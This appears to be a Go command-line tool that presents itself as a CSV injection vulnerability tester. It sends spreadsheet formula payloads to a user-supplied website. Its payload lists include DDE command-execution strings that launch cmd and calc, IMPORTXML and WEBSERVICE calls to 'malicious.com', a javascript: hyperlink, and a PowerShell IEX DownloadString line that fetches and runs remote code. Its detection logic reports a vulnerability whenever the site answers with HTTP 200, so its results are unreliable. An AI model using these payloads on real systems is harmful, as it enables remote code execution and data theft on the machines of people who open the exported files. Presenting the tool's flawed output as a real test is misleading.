package main

import (
    "bufio"
    "fmt"
    "net/http"
    "os"
    "strings"
)

func main() {
    fmt.Println("CSV Injection Vulnerability Tester")
    fmt.Print("Enter your target website URL: ")
    reader := bufio.NewReader(os.Stdin)
    url, _ := reader.ReadString('\n')
    url = strings.TrimSpace(url)

    fmt.Println("Testing for CSV Injection vulnerability on:", url)

    // Test for basic CSV Injection vulnerability
    basicInjectionTest(url)

    // Test for more advanced CSV Injection techniques
    advancedInjectionTest(url)
}

// Test for basic CSV Injection vulnerability
func basicInjectionTest(url string) {
    fmt.Println("\nTesting for basic CSV Injection vulnerability...")

    payloads := []string{
        `=cmd|' /C calc'!A1`,                  // Command execution on Windows
        `=SUM(A1+A2)`,                         // Formula injection
        `=@SUM(A1:A2)`,                        // Formula injection
        `=IMPORTXML("http://malicious.com",)`, // External data import
        `=HYPERLINK("javascript:alert(1)",)`, // JavaScript execution
        `=WEBSERVICE("http://malicious.com")`, // External data import
        `=EXEC("powershell IEX (New-Object Net.WebClient).DownloadString('http://malicious.com')")`, // PowerShell execution
    }

    for _, payload := range payloads {
        injectedURL := url + "?search=" + payload

        resp, err := http.Get(injectedURL)
        if err != nil {
            fmt.Println("Error:", err)
            continue
        }
        defer resp.Body.Close()

        if resp.StatusCode == http.StatusOK {
            fmt.Println("Basic CSV Injection vulnerability detected!")
            fmt.Println("Payload:", payload)
            fmt.Println("To test this vulnerability, open the generated CSV file and verify if the payload executed.")
            return
        }
    }

    fmt.Println("No basic CSV Injection vulnerability detected.")
}

// Test for more advanced CSV Injection techniques
func advancedInjectionTest(url string) {
    fmt.Println("\nTesting for advanced CSV Injection techniques...")

    payloads := []string{
        `=MSEXCEL|'\..\..\..\windows\system32\cmd.exe /c calc.exe'!A1`, // Command execution on Windows with MS Excel DDE
        `=IFS("1=1", "True", "False")`,                                 // Function injection in Google Sheets
    }

    for _, payload := range payloads {
        injectedURL := url + "?search=" + payload

        resp, err := http.Get(injectedURL)
        if err != nil {
            fmt.Println("Error:", err)
            continue
        }
        defer resp.Body.Close()

        if resp.StatusCode == http.StatusOK {
            fmt.Println("Advanced CSV Injection vulnerability detected!")
            fmt.Println("Payload:", payload)
            fmt.Println("To test this vulnerability, open the generated CSV file and verify if the payload executed.")
            return
        }
    }

    fmt.Println("No advanced CSV Injection vulnerability detected.")
}
